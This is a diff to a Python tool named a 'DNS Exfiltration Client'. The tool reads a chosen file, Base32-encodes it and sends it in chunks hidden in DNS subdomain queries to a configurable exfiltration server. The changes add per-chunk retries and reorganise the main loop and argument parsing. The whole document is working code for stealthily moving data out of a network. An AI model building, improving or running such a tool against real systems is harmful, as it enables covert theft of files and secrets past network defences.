@@ -11,26 +11,27 @@ Author: John Burns
 Date: 2024-04-30
 Version: 1.3 (AES-GCM encryption + Base32, dynamic chunk sizing)
 """
-
-import os
-import base64
 import argparse
+import base64
 import logging
+import os
 import socket
-from uuid import uuid4
-from dnslib import DNSRecord, DNSQuestion, QTYPE
 from math import ceil
+from uuid import uuid4
+
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+from dnslib import DNSRecord, DNSQuestion, QTYPE
 from dotenv import load_dotenv, find_dotenv
+
 load_dotenv(find_dotenv())
 
 # Configure logging
-logging.basicConfig(level=logging.INFO,
-                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
 logger = logging.getLogger('client')
 
 # Load AES-GCM key from environment (hex-encoded, 32 bytes)
 EXFIL_KEY = bytes.fromhex(os.environ['EXFIL_KEY'])
+
 
 def encrypt_data(raw: bytes) -> bytes:
     """
@@ -91,35 +92,68 @@ def send_dns_query(subdomain, args):
         sock.close()
 
 
-def main():
-    args = get_args()
-    identifier = uuid4().hex[:8]
-    encoded = encode_file_contents_base32(args.file_path)
-    segments, total_segments, chunk_size = make_segments(encoded, identifier)
-    logger.info("Exfiltrating %s in %d segments (chunk_size=%d)",
-                args.file_path, total_segments, chunk_size)
+MAX_RETRIES = 3  # How many times to retry each chunk
+
+
+def reliable_send(subdomain, args, retries=MAX_RETRIES):
+    """Send DNS query and retry if no response."""
+    query = DNSRecord(q=DNSQuestion(f"{subdomain}.{args.domain}", QTYPE.A))
+    query_data = query.pack()
+
+    for attempt in range(1, retries + 1):
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        try:
+            sock.settimeout(2)
+            sock.sendto(query_data, (args.server_ip, args.server_port))
+            response, _ = sock.recvfrom(1024)
+            print(f"✓ Received response for chunk [{subdomain[:40]}...]:", DNSRecord.parse(response).short())
+            sock.close()
+            return True
+        except socket.timeout:
+            print(f"⚠️ Timeout (attempt {attempt}) for chunk [{subdomain[:40]}...]")
+        except Exception as e:
+            print(f"❌ Error sending chunk [{subdomain[:40]}...]: {e}")
+        finally:
+            sock.close()
+    return False
+
+
+def main(args):
+    identifier = str(uuid4()).replace('-', '')[:8]
+    encoded_data = encode_file_contents_base32(args.file_path)
+    max_length = 63 - len(identifier) - 16 - 3
+    segments = list(chunk_data(encoded_data, max_length))
+    total_segments = len(segments)
+
+    print(f"Sending {total_segments} chunks for identifier: {identifier}")
+
+    failures = []
 
     for i, chunk in enumerate(segments):
-        logger.info("Sending segment %d/%d (len=%d)", i+1, total_segments, len(chunk))
         subdomain = f"{identifier}-{i}-{total_segments}-{chunk}"
         if len(subdomain) > 63:
-            logger.error("Subdomain too long (%d chars): %s", len(subdomain), subdomain)
+            print(f"❗ Subdomain too long ({len(subdomain)} chars), skipping: {subdomain}")
             continue
-        send_dns_query(subdomain, args)
+        success = reliable_send(subdomain, args)
+        if not success:
+            failures.append(i)
+
+    if failures:
+        print(f"\n❌ Failed to send {len(failures)} chunks after {MAX_RETRIES} retries:")
+        print(failures)
+    else:
+        print("\n✅ All chunks sent successfully.")
 
 
 def get_args():
     parser = argparse.ArgumentParser(description="DNS Exfiltration Client (AES-GCM + Base32)")
-    parser.add_argument("--server-ip", type=str, default="127.0.0.1",
-                        help="IP address of the DNS exfil server")
-    parser.add_argument("--server-port", type=int, default=5300,
-                        help="UDP port of the DNS exfil server")
-    parser.add_argument("--file-path", required=True,
-                        help="Path to the file to exfiltrate")
-    parser.add_argument("--domain", type=str,
-                        default="xf.example.com",
-                        help="Domain suffix for queries")
+    parser.add_argument("--server-ip", type=str, default="127.0.0.1", help="IP address of the DNS exfil server")
+    parser.add_argument("--server-port", type=int, default=5300, help="UDP port of the DNS exfil server")
+    parser.add_argument("--file-path", required=True, help="Path to the file to exfiltrate")
+    parser.add_argument("--domain", type=str, default="xf.example.com", help="Domain suffix for queries")
     return parser.parse_args()
 
+
 if __name__ == "__main__":
-    main()
+    args = get_args()
+    main(args)
